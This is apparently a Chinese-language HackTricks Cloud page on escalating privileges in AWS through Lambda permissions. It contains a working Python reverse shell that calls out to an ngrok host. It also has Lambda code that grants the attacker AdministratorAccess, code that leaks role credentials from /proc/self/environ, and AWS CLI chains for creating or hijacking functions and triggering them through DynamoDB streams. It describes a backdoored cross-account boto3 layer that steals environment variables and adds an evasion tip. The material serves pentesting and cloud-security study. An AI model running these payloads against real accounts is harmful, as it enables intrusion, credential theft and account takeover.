# AWS - Lambda提权

<details>

<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS红队专家）</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

- 如果您想在HackTricks中看到您的**公司广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
- 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
- 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[NFTs收藏品](https://opensea.io/collection/the-peass-family)
- **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或在**Twitter**上关注我们 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**。**
- 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>

## lambda

有关Lambda的更多信息，请查看：

{% content-ref url="../../aws-security/aws-services/aws-lambda-enum.md" %}
[aws-lambda-enum.md](../../aws-security/aws-services/aws-lambda-enum.md)
{% endcontent-ref %}

### `iam:PassRole`, `lambda:CreateFunction`, (`lambda:InvokeFunction` | `lambda:InvokeFunctionUrl`)

拥有**`iam:PassRole`, `lambda:CreateFunction`和`lambda:InvokeFunction`**权限的用户可以升级其特权。\
他们可以**创建一个新的Lambda函数并为其分配现有的IAM角色**，从而授予该函数与该角色关联的权限。然后用户可以**编写并上传代码到此Lambda函数（例如使用反向shell）**。\
设置好函数后，用户可以通过AWS API调用Lambda函数来**触发其执行**和预期的操作。这种方法有效地允许用户通过Lambda函数间接执行任务，使用与其关联的IAM角色授予的访问级别。\\

攻击者可以滥用此功能获取**反向shell并窃取令牌**：

{% code title="rev.py" %}
```python
import socket,subprocess,os,time
def lambda_handler(event, context):
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(('4.tcp.ngrok.io',14305))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(['/bin/sh','-i'])
time.sleep(900)
return 0
```
{% endcode %}
```bash
# Zip the rev shell
zip "rev.zip" "rev.py"

# Create the function
aws lambda create-function --function-name my_function \
--runtime python3.9 --role <arn_of_lambda_role> \
--handler rev.lambda_handler --zip-file fileb://rev.zip

# Invoke the function
aws lambda invoke --function-name my_function output.txt
## If you have the lambda:InvokeFunctionUrl permission you need to expose the lambda inan URL and execute it via the URL

# List roles
aws iam list-attached-user-policies --user-name <user-name>
```
你也可以**滥用lambda角色权限**从lambda函数本身。\
如果lambda角色有足够的权限，你可以使用它来授予管理员权限给你：
```python
import boto3
def lambda_handler(event, context):
client = boto3.client('iam')
response = client.attach_user_policy(
UserName='my_username',
PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
)
return response
```
也有可能在不需要外部连接的情况下泄露lambda的角色凭证。这对于用于内部任务的**网络隔离的 Lambdas**非常有用。如果有未知的安全组过滤您的反向 shell，这段代码将允许您直接将凭证作为 lambda 的输出泄露出来。
```python
def handler(event, context):
sessiontoken = open('/proc/self/environ', "r").read()
return {
'statusCode': 200,
'session': str(sessiontoken)
}
```

```bash
aws lambda invoke --function-name <lambda_name> output.txt
cat output.txt
```
**潜在影响：** 直接特权升级到指定的任意 Lambda 服务角色。

{% hint style="danger" %}
请注意，即使看起来很有趣 **`lambda:InvokeAsync`**，单独使用并不能执行 `aws lambda invoke-async`，你还需要 `lambda:InvokeFunction`
{% endhint%}

### `iam:PassRole`、`lambda:CreateFunction`、`lambda:AddPermission`

与前一个场景类似，如果你拥有 `lambda:AddPermission` 权限，你可以为自己授予 `lambda:InvokeFunction` 权限。
```bash
# Check the previous exploit and use the following line to grant you the invoke permissions
aws --profile "$NON_PRIV_PROFILE_USER" lambda add-permission --function-name my_function \
--action lambda:InvokeFunction --statement-id statement_privesc --principal "$NON_PRIV_PROFILE_USER_ARN"
```
**潜在影响:** 直接提升到指定的任意 Lambda 服务角色。

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateEventSourceMapping`

具有 **`iam:PassRole`, `lambda:CreateFunction` 和 `lambda:CreateEventSourceMapping`** 权限的用户（可能还具有 `dynamodb:PutItem` 和 `dynamodb:CreateTable` 权限）即使没有 `lambda:InvokeFunction` 也可以间接 **提升权限**。\
他们可以创建一个带有恶意代码的 Lambda 函数，并为其分配现有的 IAM 角色。

用户不直接调用 Lambda，而是设置或利用现有的 DynamoDB 表，通过事件源映射将其与 Lambda 相关联。这种设置确保 Lambda 函数在表中有新条目输入时自动触发，无论是用户的操作还是其他进程，从而间接调用 Lambda 函数并以传递的 IAM 角色权限执行代码。
```bash
aws lambda create-function --function-name my_function \
--runtime python3.8 --role <arn_of_lambda_role> \
--handler lambda_function.lambda_handler \
--zip-file fileb://rev.zip
```
如果在AWS环境中已经激活了DynamoDB，则用户只需要为Lambda函数**建立事件源映射**。然而，如果未使用DynamoDB，则用户必须**创建一个启用了流式处理的新表**：
```bash
aws dynamodb create-table --table-name my_table \
--attribute-definitions AttributeName=Test,AttributeType=S \
--key-schema AttributeName=Test,KeyType=HASH \
--provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5 \
--stream-specification StreamEnabled=true,StreamViewType=NEW_AND_OLD_IMAGES
```
现在可以通过**创建事件源映射**将Lambda函数连接到DynamoDB表：
```bash
aws lambda create-event-source-mapping --function-name my_function \
--event-source-arn <arn_of_dynamodb_table_stream> \
--enabled --starting-position LATEST
```
当与DynamoDB流链接的Lambda函数时，攻击者可以通过激活DynamoDB流来**间接触发Lambda**。这可以通过**向DynamoDB表插入项目**来实现：
```bash
aws dynamodb put-item --table-name my_table \
--item Test={S="Random string"}
```
**潜在影响：** 直接特权升级到指定的 Lambda 服务角色。

### `lambda:AddPermission`

拥有此权限的攻击者可以**授予自己（或他人）任何权限**（这会生成基于资源的策略，以授予对资源的访问权限）：
```bash
# Give yourself all permissions (you could specify granular such as lambda:InvokeFunction or lambda:UpdateFunctionCode)
aws lambda add-permission --function-name <func_name> --statement-id asdasd --action '*' --principal arn:<your user arn>

# Invoke the function
aws lambda lambda invoke --function-name <func_name> /tmp/outout
```
{% endcode %}

**潜在影响:** 直接提升至lambda服务角色，通过授予权限来修改代码并运行。

### `lambda:AddLayerVersionPermission`

拥有此权限的攻击者可以**授予自己（或他人）`lambda:GetLayerVersion`权限**。他可以访问该层并搜索漏洞或敏感信息

{% code overflow="wrap" %}
```bash
# Give everyone the permission lambda:GetLayerVersion
aws lambda add-layer-version-permission --layer-name ExternalBackdoor --statement-id xaccount --version-number 1 --principal '*' --action lambda:GetLayerVersion
```
{% endcode %}

**潜在影响:** 可能访问敏感信息。

### `lambda:UpdateFunctionCode`

拥有 **`lambda:UpdateFunctionCode`** 权限的用户有可能 **修改与 IAM 角色关联的现有 Lambda 函数的代码。**\
攻击者可以 **修改 Lambda 的代码以窃取 IAM 凭据**。

尽管攻击者可能没有直接调用函数的能力，但如果 Lambda 函数是预先存在且正在运行的，很可能会通过现有工作流程或事件触发，从而间接促进修改后的代码的执行。

{% code overflow="wrap" %}
```bash
# Thezip should contain the lambda code (trick: DOwnload the current one and add your code there)
aws lambda update-function-code --function-name target_function \
--zip-file fileb:///my/lambda/code/zipped.zip

# If you have invoke permissions:
aws lambda invoke --function-name my_function output.txt

# If not check if it's exposed in any URL or via an API gateway you could access
```
{% endcode %}

**潜在影响:** 直接提升lambda服务角色的权限。

### `lambda:UpdateFunctionConfiguration`

#### 简介

[**Lambda Layers**](https://docs.aws.amazon.com/lambda/latest/dg/configuration-layers.html) 允许在您的lambda函数中包含**代码**，但将其**单独存储**，因此函数代码可以保持较小，**多个函数可以共享代码**。

在lambda中，您可以使用以下类似的函数检查加载python代码的路径：
```python
import json
import sys

def lambda_handler(event, context):
print(json.dumps(sys.path, indent=2))
```
这些位置是：

1. /var/task
2. /opt/python/lib/python3.7/site-packages
3. /opt/python
4. /var/runtime
5. /var/lang/lib/python37.zip
6. /var/lang/lib/python3.7
7. /var/lang/lib/python3.7/lib-dynload
8. /var/lang/lib/python3.7/site-packages
9. /opt/python/lib/python3.7/site-packages
10. /opt/python

例如，库boto3是从`/var/runtime/boto3`（第4个位置）加载的。

#### 利用

**将一个层附加到一个函数**只需要`lambda:UpdateFunctionConfiguration`权限，**层可以跨帐户共享**。我们还需要知道**他们正在使用哪些库**，这样我们才能正确地覆盖它们，但在这个示例中，我们将**假设被攻击的函数正在导入boto3**。

为了安全起见，我们将使用Pip安装与我们针对的Lambda运行时相同版本的boto3库（Python 3.7），以确保目标函数中不会出现任何可能引起问题的不同之处。该运行时目前使用的是boto3版本1.9.42。

使用以下代码，我们将安装boto3版本1.9.42及其依赖项到一个本地的"lambda\_layer"文件夹：
```
pip3 install -t ./lambda_layer boto3==1.9.42
```
接下来，我们将打开 `/lambda_layer/boto3/__init__.py` 并添加恶意代码。我们要添加的 payload 如下所示：

![](<../../../.gitbook/assets/image (26).png>)

`requests` 是从 `botocore` 中导入的。该函数将窃取环境变量，并且 try-except 和 0.1 超时是为了确保这段代码不会出错。

{% hint style="info" %}
**重要提示：** 在真实的渗透测试中，不应再使用 `from botocore.vendored import requests`，因为这样会在 CloudWatch 日志中打印“DeprecationWarning”，很可能会导致被防御者发现。
{% endhint %}

现在，将该代码打包成一个 **ZIP 文件** 并 **上传** 到 **攻击者账户中的新 Lambda 层**。您需要首先创建一个“python”文件夹，并将您的库放在其中，这样一旦我们将其上传到 Lambda，代码将被放置在“/opt/python/boto3”路径下。此外，请确保该层与 Python 3.7 兼容，并且**位于与我们目标函数相同的区域**。完成后，我们将使用 `lambda:AddLayerVersionPermission` 来**使该层公开可访问**，以便我们的目标账户可以使用它。在此 API 调用中，请使用您的个人 AWS 凭据。
```bash
aws lambda add-layer-version-permission --layer-name boto3 \
--version-number 1 --statement-id public \
--action lambda:GetLayerVersion --principal *
```
现在使用我们拥有的**被入侵的凭证**，我们将在目标Lambda函数“s3-getter”上运行以下命令，这将**附加我们的跨账户Lambda层**。
```bash
aws lambda update-function-configuration \
--function-name s3-getter \
--layers arn:aws:lambda:REGION:OUR-ACCOUNT-ID:layer:boto3:1 \
--timeout 300 #5min for rev shells
```
下一步要么是**调用函数**，如果我们可以的话，要么就等到它被正常手段调用——这是更安全的方法。

在以下**更隐秘的方式**中可以找到利用这个漏洞的方法：

{% content-ref url="../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md" %}
[aws-lambda-layers-persistence.md](../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md)
{% endcontent-ref %}

**潜在影响：** 直接提升到使用的lambda服务角色。

### `?iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateFunctionUrlConfig`, `lambda:InvokeFunctionUrl`

也许有了这些权限，你可以创建一个函数并通过调用URL来执行它... 但我找不到测试的方法，所以如果你找到了，请告诉我！

### Lambda MitM

一些lambda函数将会**从用户的参数中接收敏感信息**。如果在其中一个函数中获得了RCE，你可以窃取其他用户发送给它的信息，请查看：

{% content-ref url="../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md" %}
[aws-warm-lambda-persistence.md](../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md)
{% endcontent-ref %}

## 参考资料

* [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)
* [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2/)

<details>

<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

支持HackTricks的其他方式：

* 如果你想看到你的**公司在HackTricks中做广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
* 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[NFTs](https://opensea.io/collection/the-peass-family)收藏品
* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或在**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**上关注**我们。
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github仓库提交PR来分享你的黑客技巧**。

</details>
